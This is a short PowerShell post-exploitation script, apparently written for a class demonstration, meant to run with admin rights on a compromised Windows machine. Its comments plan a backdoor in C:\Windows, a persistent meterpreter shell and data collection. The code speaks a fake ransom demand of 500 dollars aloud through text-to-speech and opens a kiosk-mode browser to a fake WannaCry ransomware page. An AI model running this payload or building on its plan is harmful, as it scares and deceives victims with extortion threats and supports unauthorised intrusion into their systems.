
<# --------------- These commands are for fun, once we get remote access --------------------------
In real life:
the goal is to be stealthy but since we're trying to present this to a class
we might as well have some fun
#>
#reference: https://github.com/Hackstur/JokerShell
#https://lifetipspro.com/best-command-prompt-pranks-cmd-pranks/


#You shoudl have access to the Windows System Folder since it's run as admin
#From here you can change your login passwords etc etc
#But MORE IMPORTANTLY!

<#-------------------------------- NEXT STEPS -------------------------------
1) Create a backdoor in the C:\Windows folder (we are already admin)
2) get a persistent shell or meterpreter shell
3) exploit more & start collecting data
#>



#Text-to-Speech:
Function Speak-Text($Text) { Add-Type -AssemblyName System.speech; $TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; $TTS.Speak($Text) }
Speak-Text "You have just been hacked. All your files will be deleted and your personal information will be leaked online if you do not pay us 500 dollars"
Exit

#Fake Wanna Cry ransomeware
Start-Process iexplore -ArgumentList "-k http://fakeupdate.net/wnc/"